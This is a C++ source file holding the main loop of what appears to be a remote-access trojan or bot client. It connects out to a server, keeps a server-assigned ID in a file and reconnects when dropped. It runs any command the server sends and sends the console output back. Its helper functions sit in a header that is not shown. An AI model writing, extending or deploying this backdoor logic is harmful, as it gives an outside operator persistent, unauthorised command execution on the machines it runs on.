#include "addition.h"

using namespace mySTL;

int main()
{
    SOCKET *sock = nullptr;
    SOCKET *responseSock = nullptr;
    sockaddr_in *addr;
    char *id = nullptr;
    char *msg;
    int isStart = false;
    if ( (id = readFromFile(ID_FILE_NAME)) == nullptr )
    {
        id = mySTL::addStr(id, "-1");
    }
    char *output = nullptr;
    addr = initPreConnection();
    sock = initConnection(addr);
    sendRequest(sock, id);
    while ( true )
    {
        char c = listenData(sock);

        if (c == -1)
        {
            printf("\nClosed\n");
            closesocket(*sock);
            free(sock);
            sock = initConnection(addr);
            sendRequest(sock, id);
            continue;
        }
        if (c != 0)
        printf("%c", c);
        if ( (msg = mySTL::extractMsg(c, "msg{$}")) != nullptr )
        {
            if ( msg[mySTL::strlen(msg)-1] == '#')
            {
                msg[mySTL::strlen(msg)-1] = 0;
                free(id);
                id = nullptr;
                id = mySTL::addStr(id, msg);
                writeToFile(ID_FILE_NAME, id);
                closesocket(*sock);
                continue;
            }
            if ( mySTL::strcmp(msg, "&ping") == false )
            {
                isStart = execCommand(msg);
                //printf("%s", output);
            }
        }
        if (isStart == true)
        output = readConsoleOutput(hReadPipe1);
        if ( output != nullptr )
        {
            responseSock = initConnection(addr);
            sendConsoleOutput(responseSock, output, id);
            closesocket(*responseSock);
            free(responseSock);
            free(output);
            output = nullptr;
        }
        Sleep(LOOP_TIME_WAIT);
    }
}
